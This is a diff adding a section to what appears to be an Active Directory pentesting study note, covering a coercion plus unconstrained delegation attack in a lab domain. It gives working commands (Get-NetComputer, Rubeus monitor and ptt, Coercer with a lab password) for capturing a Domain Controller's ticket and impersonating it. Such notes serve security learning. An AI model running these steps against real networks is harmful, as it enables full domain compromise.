@@ -95,3 +95,54 @@ Enter-PSSession dc1
 Invoke-WebRequest http://HYDRA-DC.MARVEL.local -UseDefaultCredentials -UseBasicParsing
 ```
 
+### Coercing Attacks & Unconstrained Delegation
+A coercing attack forces a Domain Controller (DC) to authenticate to a machine chosen by the attacker.
+If that machine is configured with Unconstrained Delegation, it will store the DC’s Kerberos TGT in memory.
+The attacker then extracts that TGT and can impersonate the DC, allowing full domain compromise (DCSync, DA access) — without cracking passwords.
+
+Find machines with Unconstrained Delegation
+(attacker already has domain user access)
+```bash
+Get-NetComputer -Unconstrained | select samaccountname
+```
+
+🔹 Goal: Find a machine that stores incoming Kerberos tickets
+🔹 Example result:
+```bash
+SERVER01$
+WS001$
+DC1$
+```
+
+Start listening for Kerberos tickets on the delegated machine
+(attacker has admin on WS001)
+```bash
+.\Rubeus.exe monitor /interval:1
+```
+🔹 Goal: Wait for a DC TGT to appear in memory
+
+Force (coerce) the Domain Controller to authenticate
+(run from attacker machine)
+```bash
+Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
+```
+What happens:
+DC1 is forced to authenticate to WS001
+DC1 sends its Kerberos TGT
+WS001 stores it (because of Unconstrained Delegation)
+
+4️⃣ Extract & use the DC TGT
+(back on WS001)
+Rubeus shows something like:
+```bash
+ServiceName : krbtgt/eagle.local
+UserName    : DC1$
+```
+Now you can:
+```bash
+.\Rubeus.exe ptt /ticket:DC1.kirbi
+```
+You are now effectively the Domain Controller
+
+One-line memory rule:
+Coercion forces the DC to log in, Unconstrained Delegation saves the ticket, attacker steals it and becomes the domain.
